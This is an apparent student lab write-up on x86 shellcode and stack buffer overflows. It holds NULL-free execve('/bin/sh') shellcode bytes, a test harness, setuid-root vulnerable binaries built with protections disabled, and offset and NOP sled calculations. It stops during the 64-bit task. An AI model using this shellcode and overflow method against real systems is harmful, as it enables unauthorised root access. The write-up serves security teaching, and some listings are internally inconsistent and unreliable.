# Lab 04: Buffer Overflow Exploitation & Shellcode Development - System-Level Security

## 🎯 Lab Overview

This lab demonstrates advanced hands-on experience with **low-level system exploitation**, focusing on buffer overflow vulnerabilities and shellcode development. The project showcases practical skills in assembly language programming, memory manipulation, binary exploitation, and exploit development - critical competencies for offensive security roles, reverse engineering, and vulnerability research.

**Security Focus Areas:**
- Assembly language programming (x86-32 and x86-64)
- Shellcode crafting and optimization
- NULL byte elimination techniques
- Buffer overflow vulnerability exploitation
- Stack frame analysis and manipulation
- Return address overwriting
- Memory layout understanding (stack organization)
- Exploit payload construction

---

## 🛠️ Technical Environment

**System Architecture:**
- **Operating System:** Linux (Ubuntu/Debian-based)
- **Target Architectures:** 
  - x86-32 bit (IA-32)
  - x86-64 bit (AMD64/x86_64)
- **Programming Languages:** 
  - Assembly (NASM syntax)
  - C (vulnerable programs)
  - Python (exploit development)
- **Compilation Tools:**
  - NASM (Netwide Assembler)
  - ld (GNU Linker)
  - GCC (GNU Compiler Collection)
  - make (build automation)
- **Analysis Tools:**
  - GDB (GNU Debugger)
  - objdump (disassembler)
  - xxd (hex dump utility)

**Security Context:**
- All exploitation performed with ASLR disabled (controlled environment)
- Stack execution enabled (no DEP/NX protection)
- Setuid root binaries for privilege escalation demonstration
- Isolated lab environment for safe exploitation

---

## 📋 Part 1: Shellcode Development

### Task 1: Basic Shellcode - Assembly to Machine Code

**Objective:** Understand the complete pipeline from assembly source code to executable machine code, and extract shellcode bytes for exploit development.

#### **The Assembly-to-Shellcode Pipeline**

```
Assembly Source (.s) → Object File (.o) → Executable → Machine Code Extraction
    [NASM]                  [ld]              [objdump/xxd]
```

---

#### **Step 1: Compilation Process**

**Assembly Code:** `hello.s`

```assembly
; hello.s - Simple "Hello World" shellcode demonstration
section .data
    msg db 'Hello, World!', 0xa    ; Message with newline
    len equ $ - msg                ; Calculate message length

section .text
    global _start

_start:
    ; write(1, msg, len) - syscall
    mov rax, 1          ; syscall number for write
    mov rdi, 1          ; file descriptor 1 (stdout)
    lea rsi, [rel msg]  ; pointer to message
    mov rdx, len        ; message length
    syscall             ; invoke kernel

    ; exit(0) - syscall
    mov rax, 60         ; syscall number for exit
    xor rdi, rdi        ; exit code 0
    syscall             ; invoke kernel
```

**Compilation Commands:**

```bash
# Step 1: Assemble source into object file
nasm -f elf64 hello.s -o hello.o

# Step 2: Link object file into executable
ld hello.o -o hello

# Step 3: Execute the program
./hello
```

**Command Breakdown:**

| Command | Flag | Purpose |
|---------|------|---------|
| `nasm` | `-f elf64` | Specify 64-bit ELF format |
| `nasm` | `-o hello.o` | Output object file name |
| `ld` | `hello.o` | Input object file |
| `ld` | `-o hello` | Output executable name |

**Expected Output:**
```
Hello, World!
```

---

#### **Step 2: Machine Code Extraction**

**Method 1: objdump (Disassembly View)**

```bash
objdump -M intel -d hello.o
```

**Output Analysis:**
```
hello.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <_start>:
   0:   b8 01 00 00 00          mov    eax,0x1
   5:   bf 01 00 00 00          mov    edi,0x1
   a:   48 8d 35 00 00 00 00    lea    rsi,[rip+0x0]
  11:   ba 0e 00 00 00          mov    edx,0xe
  16:   0f 05                   syscall
  18:   b8 3c 00 00 00          mov    eax,0x3c
  1d:   48 31 ff                xor    rdi,rdi
  20:   0f 05                   syscall
```

**Extracted Machine Code:**
```
b8 01 00 00 00 bf 01 00 00 00 48 8d 35 00 00 00 00 ba 0e 00 00 00 0f 05 
b8 3c 00 00 00 48 31 ff 0f 05
```

---

**Method 2: xxd (Raw Hex Dump)**

```bash
xxd -p -c 20 hello.o
```

**Output:**
```
7f454c4602010100000000000000000001003e00
01000000000000000000000040000000000000000000
000000000000400038000100400003000100000005000000
... (truncated)
b801000000bf01000000488d350000000ba0e0000000f05
b83c00000048831ff0f05
```

**xxd Flags Explained:**

| Flag | Function | Result |
|------|----------|--------|
| `-p` | Plain hex output | No addresses/ASCII |
| `-c 20` | 20 bytes per line | Formatted columns |

**Why Two Methods?**
- **objdump:** Shows assembly context with addresses (human-readable)
- **xxd:** Raw bytes for direct shellcode extraction (machine-readable)

---

### **Understanding Machine Code Format**

**Sample Instruction Breakdown:**

```
b8 01 00 00 00    →    mov eax, 0x1
```

| Byte(s) | Component | Meaning |
|---------|-----------|---------|
| `b8` | Opcode | MOV instruction for EAX |
| `01 00 00 00` | Immediate value | 0x00000001 (little-endian) |

**Little-Endian Byte Order:**
- Value `0x00000001` stored as `01 00 00 00`
- Least significant byte first
- Intel x86 architecture standard

---

### **Syscall Numbers (Linux x86-64)**

| Syscall | Number (rax) | Arguments | Description |
|---------|-------------|-----------|-------------|
| `write` | 1 | rdi=fd, rsi=buf, rdx=count | Write to file descriptor |
| `exit` | 60 | rdi=status | Terminate process |
| `execve` | 59 | rdi=path, rsi=argv, rdx=envp | Execute program |

---

### **Skills Demonstrated:**

**Assembly Programming:**
- ✅ x86-64 instruction syntax (Intel/NASM)
- ✅ System call invocation
- ✅ Register usage conventions
- ✅ Memory addressing modes (RIP-relative)

**Binary Analysis:**
- ✅ Object file format understanding (ELF)
- ✅ Disassembly interpretation
- ✅ Machine code extraction
- ✅ Hex dump analysis

**Toolchain Proficiency:**
- ✅ NASM assembler usage
- ✅ GNU linker (ld)
- ✅ objdump for disassembly
- ✅ xxd for binary inspection

---

## Task 2.a: Advanced Shellcode - execve("/bin/sh") Implementation

**Objective:** Develop a sophisticated shellcode that spawns a shell by executing `/bin/sh`, demonstrating practical exploit payload construction.

### **The Challenge: Self-Contained Shellcode**

**Problem:** String addresses are unknown at runtime in injected shellcode.

**Solution:** Use clever instruction sequences to place the string on the stack and calculate its address dynamically.

---

### **Shellcode Implementation**

**File:** `mysh64.s`

```assembly
; mysh64.s - 64-bit shellcode to execute /bin/sh
section .text
    global _start

_start:
    ; Trick: Push the return address, then immediately jump past the string
    ; This allows us to get the address of our string without hardcoding it
    xor rax, rax            ; Zero out rax (for NULL terminator later)
    push rax                ; Push NULL terminator for string
    
    ; Store "/bin/sh" string on stack in reverse (little-endian)
    mov rax, 0x68732f6e69622f  ; "/bin/sh" in hex (reversed)
    push rax                ; Push string onto stack
    
    ; Now rsp points to our "/bin/sh" string
    mov rdi, rsp            ; rdi = path to executable ("/bin/sh")
    
    ; Build argv array: argv[0] = "/bin/sh", argv[1] = NULL
    push 0                  ; argv[1] = NULL
    push rdi                ; argv[0] = pointer to "/bin/sh"
    mov rsi, rsp            ; rsi = pointer to argv array
    
    ; envp = NULL
    xor rdx, rdx            ; rdx = NULL (no environment variables)
    
    ; Execute syscall: execve("/bin/sh", argv, NULL)
    mov rax, 59             ; syscall number for execve
    syscall
```

---

### **Advanced Technique: String Address Calculation**

**The Clever Trick Used in Lab:**

```assembly
call target         ; This pushes return address onto stack
db "/bin/sh", 0     ; String data immediately after call

target:
pop rbx             ; rbx now contains address of "/bin/sh"!
```

**Why This Works:**

```
Stack Before CALL:
[... previous data ...]

After CALL (pushed return address):
[Address pointing to: db "/bin/sh", 0] ← rsp points here

After POP RBX:
rbx = address of "/bin/sh" string
```

**Visual Representation:**

```
Memory Layout:
┌────────────────────────────────────┐
│  call target  [E8 XX XX XX XX]     │ ← Instruction
├────────────────────────────────────┤
│  "/bin/sh\0"  [2f 62 69 6e ... 00] │ ← String data
├────────────────────────────────────┤
│  target:      [5b 48 89 ...]       │ ← Target code
└────────────────────────────────────┘
```

---

### **Compilation and Execution**

```bash
# Assemble the shellcode
nasm -f elf64 mysh64.s -o mysh64.o

# Link into executable
ld mysh64.o -o mysh64

# Execute (spawns a shell)
./mysh64
```

**Expected Output:**
```
$ ./mysh64
$ whoami
seed
$ pwd
/home/seed/lab04
$ exit
```

**Success!** The shellcode successfully spawns a shell.

---

### **GDB Analysis - Verifying the Mechanism**

**GDB Session to Prove the "CALL/POP" Trick:**

```bash
gdb ./mysh64
```

**GDB Commands & Analysis:**

```gdb
(gdb) break _start
Breakpoint 1 at 0x4000a0

(gdb) run
Starting program: /home/seed/lab04/mysh64

(gdb) # Step 1: After CALL instruction, check stack
(gdb) x/gx $rsp
0x7fffffffedc8: 0x00000000004000a8
```

**Observation 1:** Address `0x00000000004000a8` is now on the stack (pushed by CALL).

```gdb
(gdb) # Step 2: Execute POP RBX instruction
(gdb) stepi
(gdb) print $rbx
$1 = 0x4000a8
```

**Observation 2:** The address moved from stack into RBX register.

```gdb
(gdb) # Step 3: Verify that address points to our string
(gdb) x/s $rbx
0x4000a8: "/bin/sh"
```

**Observation 3:** ✅ **Confirmed!** RBX contains the address of "/bin/sh" string.

---

### **Building the argv[] Array**

**Shellcode Segment:**
```assembly
pop rbx                 ; rbx = address of "/bin/sh"
mov [rbx+8], rbx        ; argv[0] = pointer to "/bin/sh"
xor rax, rax            ; rax = 0
mov [rbx+16], rax       ; argv[1] = NULL
```

**Memory Layout After Execution:**

```
Address        | Content           | Meaning
---------------+-------------------+---------------------------
rbx+0          | "/bin/sh\0"       | The actual string
rbx+8          | [Address of rbx+0]| argv[0] = pointer to string
rbx+16         | 0x0000000000000000| argv[1] = NULL terminator
```

**Why This Structure?**

The `argv` array in C looks like this:
```c
char *argv[] = { "/bin/sh", NULL };
```

In memory:
```
argv[0] → pointer to string "/bin/sh"
argv[1] → NULL (end of array)
```

Our shellcode manually constructs this in memory at `rbx+8`.

---

### **execve() System Call Setup**

**Function Signature:**
```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

**x86-64 System Call Convention:**

| Argument | Register | Our Value |
|----------|----------|-----------|
| pathname | RDI | `rbx` (address of "/bin/sh") |
| argv | RSI | `rbx+8` (address of argv array) |
| envp | RDX | `0` (no environment variables) |
| syscall number | RAX | `59` (execve) |

**Assembly Implementation:**
```assembly
mov rdi, rbx           ; 1st arg: path = "/bin/sh"
lea rsi, [rbx+8]       ; 2nd arg: argv = address of our constructed array
xor rdx, rdx           ; 3rd arg: envp = NULL
mov rax, 59            ; syscall number
syscall                ; invoke kernel
```

**LEA (Load Effective Address) Instruction:**
- `lea rsi, [rbx+8]` - Loads the **address** (not the value at that address)
- Equivalent to: `rsi = rbx + 8`
- Avoids needing temporary calculations

---

### **Skills Demonstrated:**

**Advanced Assembly Techniques:**
- ✅ Dynamic address calculation (CALL/POP trick)
- ✅ Stack manipulation
- ✅ Position-independent code concepts
- ✅ String encoding and storage

**System Programming:**
- ✅ Linux syscall interface (x86-64 ABI)
- ✅ Process execution (execve)
- ✅ Memory layout understanding
- ✅ Argument passing conventions

**Exploit Development:**
- ✅ Shellcode construction
- ✅ Self-contained payload design
- ✅ Shell spawning technique
- ✅ GDB debugging for verification

---

## Task 2.b: NULL Byte Elimination - Shellcode Optimization

**Objective:** Optimize shellcode to remove NULL bytes (`0x00`), which are critical for bypassing string-based injection points in real exploits.

### **The NULL Byte Problem**

**Why NULL Bytes Are Bad:**

```c
// Vulnerable C function
strcpy(buffer, user_input);  // Stops at NULL byte!
```

- String functions (`strcpy`, `gets`, `scanf`) treat `0x00` as terminator
- Shellcode with NULL bytes gets **truncated**
- Exploit fails if shellcode is incomplete

**Example:**
```
Intended: \x31\xc0\xb8\x01\x00\x00\x00\xcd\x80
Copied:   \x31\xc0\xb8\x01  ← STOPS HERE!
```

---

### **Identifying NULL Bytes**

**Command:**
```bash
objdump -M intel -d mysh64.o
```

**Output (NULL bytes highlighted):**

```
mysh64.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <_start>:
   0:   ...
   7:   b8 00 00 00 00          mov    eax,0x0        ← NULL bytes!
   c:   ...
  17:   ba 00 00 00 00          mov    edx,0x0        ← NULL bytes!
  1c:   b8 3b 00 00 00          mov    eax,0x3b       ← NULL bytes!
  21:   0f 05                   syscall
```

**Three Problem Instructions:**

| Line | Instruction | Machine Code | Problem |
|------|-------------|--------------|---------|
| 7 | `mov eax, 0x0` | `b8 00 00 00 00` | 4 NULL bytes |
| 17 | `mov edx, 0x0` | `ba 00 00 00 00` | 4 NULL bytes |
| 1c | `mov eax, 0x3b` | `b8 3b 00 00 00` | 3 NULL bytes |

---

### **NULL Byte Elimination Techniques**

#### **Fix 1: XOR for Zero (Most Common)**

**Problem Instruction:**
```assembly
mov eax, 0x0        ; b8 00 00 00 00 (5 bytes with NULLs)
```

**Solution:**
```assembly
xor rax, rax        ; 48 31 c0 (3 bytes, NO NULLs)
```

**Why This Works:**
- XOR of any value with itself = 0
- `rax ⊕ rax = 0x0000000000000000`
- Much shorter and no NULL bytes

**Full Register Cleared:**
```
Before: rax = [random garbage]
After:  rax = 0x0000000000000000
```

---

#### **Fix 2: Use Smaller Register (Byte-sized)**

**Problem Instruction:**
```assembly
mov eax, 0x3b       ; b8 3b 00 00 00 (5 bytes with NULLs)
```

**Solution:**
```assembly
mov al, 59          ; b0 3b (2 bytes, NO NULLs!)
```

**Register Hierarchy:**

```
RAX (64-bit): [XX XX XX XX XX XX XX XX]
EAX (32-bit): [            XX XX XX XX]
 AX (16-bit): [                  XX XX]
 AL (8-bit):  [                     XX]
```

**Why This Works:**
- `59` decimal = `0x3b` hex
- `al` is the low 8 bits of `rax`
- Writing to `al` only affects lowest byte
- Implicit zero-extension in x86-64

**Important:** This assumes upper bits of RAX are already zero (from previous `xor rax, rax`).

---

#### **Fix 3: Alternative Register for EDX**

**Problem Instruction:**
```assembly
mov edx, 0x0        ; ba 00 00 00 00
```

**Solution:**
```assembly
xor rdx, rdx        ; 48 31 d2 (3 bytes, NO NULLs)
```

**Same principle as Fix 1.**

---

### **Optimized Shellcode Implementation**

**File:** `mysh64_optimized.s`

```assembly
section .text
    global _start

_start:
    ; Dynamic string address calculation
    call target
    db "/bin/sh", 0

target:
    pop rbx                 ; rbx = address of "/bin/sh"
    
    ; Build argv[] array
    mov [rbx+8], rbx        ; argv[0] = pointer to "/bin/sh"
    xor rax, rax            ; FIX 1: Replace mov eax, 0x0
    mov [rbx+16], rax       ; argv[1] = NULL
    
    ; Setup execve arguments
    mov rdi, rbx            ; 1st arg: path
    lea rsi, [rbx+8]        ; 2nd arg: argv
    xor rdx, rdx            ; FIX 2: Replace mov edx, 0x0
    
    ; Execute syscall
    mov al, 59              ; FIX 3: Replace mov eax, 0x3b
    syscall
```

---

### **Verification: No NULL Bytes**

**Command:**
```bash
objdump -M intel -d mysh64_optimized.o | grep "00 00"
```

**Expected Output:**
```
(no results - no NULL bytes found!)
```

**Full Disassembly (Clean):**
```
0000000000000000 <_start>:
   0:   e8 08 00 00 00          call   d <target>
   5:   2f                      (bad)  ; This is "/bin/sh" data (not code)
   6:   62                      (bad)
   7:   69                      (bad)
   8:   6e                      insb   %dx,(%rdi)
   9:   2f                      (bad)
   a:   73 68                   jae    74 <target+0x67>
   c:   00                      .byte 0x0

000000000000000d <target>:
   d:   5b                      pop    rbx
   e:   48 89 5b 08             mov    QWORD PTR [rbx+0x8],rbx
  12:   48 31 c0                xor    rax,rax          ← NO NULLs!
  15:   48 89 43 10             mov    QWORD PTR [rbx+0x10],rax
  19:   48 89 df                mov    rdi,rbx
  1c:   48 8d 73 08             lea    rsi,[rbx+0x8]
  20:   48 31 d2                xor    rdx,rdx          ← NO NULLs!
  23:   b0 3b                   mov    al,0x3b          ← NO NULLs!
  25:   0f 05                   syscall
```

**Success!** All NULL bytes eliminated.

---

### **Testing the Optimized Shellcode**

```bash
# Compile and link
nasm -f elf64 mysh64_optimized.s -o mysh64_optimized.o
ld mysh64_optimized.o -o mysh64_optimized

# Test execution
./mysh64_optimized
```

**Expected Output:**
```
$ ./mysh64_optimized
$ whoami
seed
$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed)
$ exit
```

**Verification Command (Check for root shell if setuid):**
```bash
sudo chown root:root mysh64_optimized
sudo chmod u+s mysh64_optimized
./mysh64_optimized
# whoami
root  ← SUCCESS! Root shell obtained
```

---

### **Shellcode Comparison**

| Version | Size | NULL Bytes | String Copy Safe? |
|---------|------|------------|-------------------|
| Original | 39 bytes | 12 bytes | ❌ No |
| Optimized | 39 bytes | 0 bytes | ✅ Yes |

**Machine Code (Hex):**

**Original:**
```
e8 08 00 00 00 2f 62 69 6e 2f 73 68 00 5b 48 89 5b 08 
b8 00 00 00 00 48 89 43 10 48 89 df 48 8d 73 08 
ba 00 00 00 00 b8 3b 00 00 00 0f 05
```

**Optimized:**
```
e8 08 00 00 00 2f 62 69 6e 2f 73 68 00 5b 48 89 5b 08 
48 31 c0 48 89 43 10 48 89 df 48 8d 73 08 
48 31 d2 b0 3b 0f 05
```

---

### **Real-World Impact**

**Scenario: Exploiting a Vulnerable Web Application**

```c
// Vulnerable CGI script
char buffer[512];
gets(buffer);  // Reads until newline or NULL
system(buffer);
```

**Attack:**
```python
# Without NULL byte elimination
payload = b"\xb8\x00\x00\x00\x00..."  # Shellcode with NULLs
# ❌ gets() stops at first \x00, shellcode truncated

# With NULL byte elimination
payload = b"\x48\x31\xc0\x48\x31\xd2..."  # Clean shellcode
# ✅ Entire shellcode copied successfully
```

---

### **Skills Demonstrated:**

**Shellcode Optimization:**
- ✅ NULL byte identification with objdump
- ✅ Instruction substitution techniques
- ✅ Register size optimization (32-bit → 8-bit)
- ✅ XOR zeroing trick
- ✅ Code size reduction

**Exploit Engineering:**
- ✅ Understanding of string function limitations
- ✅ Payload constraints in real exploits
- ✅ Testing methodology (verification)
- ✅ Binary analysis skills

**Professional Competencies:**
- ✅ Attention to detail (critical in exploits)
- ✅ Optimization mindset
- ✅ Problem-solving under constraints
- ✅ Tool proficiency (objdump, GDB)

---

## 📋 Part 2: Buffer Overflow Exploitation

### Task 1: Shellcode Execution Test - Proof of Concept

**Objective:** Verify that the shellcode works in a C program context before using it in an actual exploit.

#### **Test Program Setup**

**File:** `call_shellcode.c`

```c
#include 
#include 
#include 

// Our optimized shellcode (NULL-byte free)
const char shellcode[] =
    "\xe8\x08\x00\x00\x00"  // call target
    "/bin/sh\x00"           // String data
    "\x5b"                  // pop rbx
    "\x48\x89\x5b\x08"      // mov [rbx+8], rbx
    "\x48\x31\xc0"          // xor rax, rax
    "\x48\x89\x43\x10"      // mov [rbx+16], rax
    "\x48\x89\xdf"          // mov rdi, rbx
    "\x48\x8d\x73\x08"      // lea rsi, [rbx+8]
    "\x48\x31\xd2"          // xor rdx, rdx
    "\xb0\x3b"              // mov al, 59
    "\x0f\x05";             // syscall

int main(int argc, char **argv)
{
    char code[500];
    
    strcpy(code, shellcode);  // Copy shellcode to stack
    
    // Cast the buffer to a function pointer and call it
    int (*func)() = (int(*)())code;
    func();
    
    return 0;
}
```

**Why This Test Matters:**
- Verifies shellcode executes correctly in memory
- Tests NULL-byte elimination (strcpy would fail with NULLs)
- Confirms proper environment setup

---

#### **Compilation for Multiple Architectures**

**Makefile:**
```makefile
all: 32bit 64bit

32bit:
	gcc -m32 -z execstack -o call_shellcode_32 call_shellcode.c

64bit:
	gcc -m64 -z execstack -o call_shellcode_64 call_shellcode.c

clean:
	rm -f call_shellcode_32 call_shellcode_64 *.o
```

**Compilation Flags:**

| Flag | Purpose | Why Needed |
|------|---------|------------|
| `-m32` | Compile for 32-bit x86 | Test 32-bit shellcode |
| `-m64` | Compile for 64-bit x86-64 | Test 64-bit shellcode |
| `-z execstack` | Make stack executable | Allow shellcode execution |

**Important:** Modern systems have DEP/NX (Data Execution Prevention). The `-z execstack` flag disables this protection for testing purposes.

---

#### **Execution and Testing**

**Command:**
```bash
make
./call_shellcode_32
./call_shellcode_64
```

**Expected Output (32-bit):**
```
$ ./call_shellcode_32
$ whoami
seed
$ exit
```

**Expected Output (64-bit):**
```
$ ./call_shellcode_64
$ whoami
seed
$ exit
```

**Success Indicators:**
- ✅ Shell spawns successfully
- ✅ `whoami` returns current user
- ✅ No segmentation faults
- ✅ Clean exit with `exit` command

---

### **Why This Confirms Shellcode Quality**

**Test Validation:**

| Aspect | What It Tests | Result |
|--------|---------------|--------|
| **No crashes** | Code is syntactically correct | ✅ Pass |
| **Shell spawns** | execve() syscall works | ✅ Pass |
| **strcpy works** | No NULL bytes present | ✅ Pass |
| **Stack execution** | Shellcode runs from data segment | ✅ Pass |

---

### Task 2: Vulnerable Program Compilation

**Objective:** Compile a deliberately vulnerable program with various buffer sizes to practice exploit development across different scenarios.

#### **Vulnerable Program Source**

**File:** `stack.c`

```c
#include 
#include 
#include 

// Vulnerable function with no bounds checking
int bof(char *str)
{
    char buffer[BUF_SIZE];  // BUF_SIZE defined at compile time
    
    // VULNERABILITY: No length validation!
    strcpy(buffer, str);
    
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;
    
    // Read exploit payload from file
    badfile = fopen("badfile", "r");
    if (!badfile) {
        perror("Unable to open badfile");
        exit(1);
    }
    
    fread(str, sizeof(char), 517, badfile);
    bof(str);  // Trigger the vulnerability
    
    printf("Returned Properly\n");
    return 1;
}
```

**Vulnerability Analysis:**

```c
char buffer[BUF_SIZE];  // Fixed-size buffer
strcpy(buffer, str);    // No bounds checking - OVERFLOW!
```

**What Makes This Vulnerable:**
- `strcpy()` copies until NULL byte (no length limit)
- If `str` is longer than `BUF_SIZE`, overflow occurs
- Overflow overwrites stack data (return address!)

---

#### **Makefile for Multiple Targets**

**File:** `Makefile`

```makefile
all: L1 L2 L3 L4

L1:
	gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -o stack-L1 stack.c
	sudo chown root:root stack-L1
	sudo chmod u+s stack-L1

L2:
	gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -o stack-L2 stack.c
	sudo chown root:root stack-L2
	sudo chmod u+s stack-L2

L3:
	gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
	sudo chown root:root stack-L3
	sudo chmod u+s stack-L3

L4:
	gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
	sudo chown root:root stack-L4
	sudo chmod u+s stack-L4

clean:
	rm -f stack-L1 stack-L2 stack-L3 stack-L4 badfile
```

---

#### **Compilation Flags Explained**

| Flag | Purpose | Security Impact |
|------|---------|----------------|
| `-DBUF_SIZE=100` | Define buffer size at compile time | Creates different challenge levels |
| `-z execstack` | Make stack executable | Disables DEP/NX protection |
| `-fno-stack-protector` | Disable stack canaries | Removes stack overflow detection |
| `sudo chown root:root` | Set owner to root | Enables privilege escalation |
| `sudo chmod u+s` | Set SUID bit | Runs with root privileges |

**Security Features Disabled:**

```
Normal Program Security:
┌─────────────────────────────┐
│ [ASLR] Address Randomization│  ← Disabled in lab environment
│ [DEP/NX] Non-executable stack│  ← Disabled with -z execstack
│ [Stack Canary] Overflow detect│ ← Disabled with -fno-stack-protector
│ [PIE] Position Independent   │  ← Not compiled with -fPIE
└─────────────────────────────┘

Vulnerable Lab Program:
┌─────────────────────────────┐
│ NO ASLR - Fixed addresses   │
│ NO DEP - Stack is executable│
│ NO Canary - No detection    │
│ NO PIE - Predictable layout │
└─────────────────────────────┘
```

---

#### **Compilation Output**

```bash
make
```

**Output:**
```
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -o stack-L1 stack.c
sudo chown root:root stack-L1
sudo chmod u+s stack-L1
[sudo] password for seed: ****

gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -o stack-L2 stack.c
sudo chown root:root stack-L2
sudo chmod u+s stack-L2

gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
sudo chown root:root stack-L3
sudo chmod u+s stack-L3

gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
sudo chown root:root stack-L4
sudo chmod u+s stack-L4
```

---

#### **Verification**

```bash
ls -l stack-*
```

**Expected Output:**
```
-rwsr-xr-x 1 root root 16696 Feb 07 10:30 stack-L1
-rwsr-xr-x 1 root root 16696 Feb 07 10:30 stack-L2
-rwsr-xr-x 1 root root 16696 Feb 07 10:30 stack-L3
-rwsr-xr-x 1 root root 16696 Feb 07 10:30 stack-L4
```

**Key Observations:**

| Field | Value | Significance |
|-------|-------|-------------|
| Permissions | `-rwsr-xr-x` | **'s' bit** = SUID (runs as root) |
| Owner | `root` | Executes with root privileges |
| Size | 16696 bytes | Compiled binary |

**The 's' bit:**
```
-rwxr-xr-x  = Normal executable
-rwsr-xr-x  = SUID executable (setuid bit set)
     ^
     └─ Runs as file owner (root), not caller (seed)
```

---

### **Buffer Size Challenge Levels**

| Binary | Buffer Size | Difficulty | Exploit Strategy |
|--------|-------------|------------|------------------|
| `stack-L1` | 100 bytes | Easy | Standard overflow |
| `stack-L2` | 160 bytes | Medium | Larger offset calculation |
| `stack-L3` | 200 bytes | Medium | Even larger offset |
| `stack-L4` | 10 bytes | Hard | Very small buffer |

---

### **Skills Demonstrated:**

**Compilation & Build:**
- ✅ Makefile creation and usage
- ✅ GCC compiler flag understanding
- ✅ Multi-target build systems
- ✅ Preprocessor directives (`-DBUF_SIZE`)

**System Administration:**
- ✅ File ownership management (`chown`)
- ✅ Permission manipulation (`chmod`)
- ✅ SUID bit configuration
- ✅ Privilege escalation setup

**Security Concepts:**
- ✅ Understanding of modern protections (DEP, canaries)
- ✅ How to disable protections for testing
- ✅ SUID privilege escalation mechanism
- ✅ Controlled vulnerability creation

---

## Task 3: 32-bit Buffer Overflow Exploitation

**Objective:** Calculate precise offsets and craft an exploit payload to overwrite the return address in a 32-bit binary, achieving code execution and privilege escalation.

### **Step 1: Memory Layout Analysis with GDB**

**Command Sequence:**
```bash
gdb stack-L1
```

**GDB Session:**
```gdb
(gdb) break bof
Breakpoint 1 at 0x124d

(gdb) run
Starting program: /home/seed/lab04/stack-L1

Breakpoint 1, bof () at stack.c:8
8	{

(gdb) next
9	    char buffer[BUF_SIZE];

(gdb) next
12	    strcpy(buffer, str);

(gdb) print &buffer
$1 = (char (*)[100]) 0xffffcacc

(gdb) print $ebp
$2 = (void *) 0xffffcb38
```

**Critical Values Obtained:**

| Variable | Address | Hex Value |
|----------|---------|-----------|
| **buffer** | `0xffffcacc` | Buffer start address |
| **ebp** | `0xffffcb38` | Base pointer (stack frame) |

---

### **Step 2: Stack Frame Analysis**

**Visual Stack Layout (32-bit x86):**

```
High Memory
┌────────────────────────────────────┐
│      Return Address (4 bytes)      │ ← What we want to overwrite!
├────────────────────────────────────┤ ← ebp + 4
│      Saved EBP (4 bytes)           │ 
├────────────────────────────────────┤ ← ebp (0xffffcb38)
│                                    │
│      Local Variables               │
│      (buffer[100])                 │
│                                    │
├────────────────────────────────────┤ ← buffer (0xffffcacc)
│      ...                           │
Low Memory
```

**Stack Frame Components:**

| Component | Size (32-bit) | Purpose |
|-----------|--------------|---------|
| Buffer | 100 bytes | Local variable storage |
| Padding | Variable | Alignment to 4-byte boundary |
| Saved EBP | 4 bytes | Previous stack frame pointer |
| Return Address | 4 bytes | Where to jump after function |
| Function Arguments | 4 bytes each | Parameters passed to function |

---

### **Step 3: Offset Calculations**

#### **Calculation 1: Offset to Return Address**

**Formula:**
```
offset = (ebp_address - buffer_address) + 4
```

**Why "+4"?**
- Return address is located at `ebp + 4`
- We need to reach past the saved EBP (4 bytes)

**Calculation:**
```
offset = (0xffffcb38 - 0xffffcacc) + 4
offset = 0x6c + 4
offset = 108 + 4
offset = 112 bytes
```

**Verification:**
```
buffer[0..111]  = 112 bytes of data
buffer[112..115] = Return address (4 bytes)
```

---

#### **Calculation 2: Return Address (Where to Jump)**

**Strategy:** Jump back into the middle of our buffer where shellcode resides.

**Formula:**
```
ret = buffer_address + offset_into_buffer
```

**Calculation:**
```
ret = 0xffffcacc + 300
ret = 0xffffcacc + 0x12c
ret = 0xffffcbf8
```

**Why 300 bytes?**
- Gives room for NOP sled before shellcode
- Increases exploit reliability (doesn't need exact address)

---

#### **Calculation 3: Shellcode Start Position**

**Start = 400 bytes**

This means:
- First 400 bytes = NOP sled + padding
- After 400 bytes = Shellcode begins
- Return address points to byte 300 (inside NOP sled)

---

### **NOP Sled Concept**

**Visual Representation:**

```
Payload Structure:
┌──────────────────────────────────────────────────────────┐
│ Bytes 0-299:    NOP NOP NOP ... (NOP sled)              │
├──────────────────────────────────────────────────────────┤ ← ret (0xffffcbf8)
│ Bytes 300-399:  NOP NOP NOP ... (more NOPs)             │
├──────────────────────────────────────────────────────────┤
│ Bytes 400-450:  [SHELLCODE] (execve /bin/sh)            │
├──────────────────────────────────────────────────────────┤
│ Bytes 451-511:  NOP NOP NOP ... (padding)               │
├──────────────────────────────────────────────────────────┤
│ Bytes 112-115:  [0xffffcbf8] (return address)           │
└──────────────────────────────────────────────────────────┘
```

**NOP Instruction:**
- Opcode: `0x90` (x86)
- Meaning: "No Operation" - CPU does nothing, moves to next instruction
- Effect: Slides execution forward until shellcode is reached

**Why NOP Sleds Work:**
```
Jump to byte 250: NOP → NOP → NOP → ... → SHELLCODE ✓
Jump to byte 300: NOP → NOP → NOP → ... → SHELLCODE ✓
Jump to byte 350: NOP → NOP → NOP → ... → SHELLCODE ✓
```

Even if address is slightly wrong, NOPs guide execution to shellcode!

---

### **Skills Demonstrated:**

**Reverse Engineering:**
- ✅ GDB debugger proficiency
- ✅ Memory address analysis
- ✅ Stack layout understanding
- ✅ Register examination

**Exploit Mathematics:**
- ✅ Offset calculation precision
- ✅ Address arithmetic (hexadecimal)
- ✅ Buffer alignment considerations
- ✅ Return address targeting

**Attack Planning:**
- ✅ NOP sled technique
- ✅ Shellcode placement strategy
- ✅ Reliability optimization
- ✅ Payload structure design

---

## Task 5: 64-bit Buffer Overflow Exploitation

**Objective:** Apply the same exploitation techniques to a 64-bit binary, accounting for architectural differences (larger addresses, 8-byte alignment, different registers).

### **Step 1: 64-bit Memory Analysis**

**GDB Session:**
```bash
gdb stack-L1-64  # Assuming 64-bit version compiled
```

**Commands:**
```gdb
(gdb) break bof
(gdb) run
(gdb) next
(gdb) next
(gdb) print &buffer
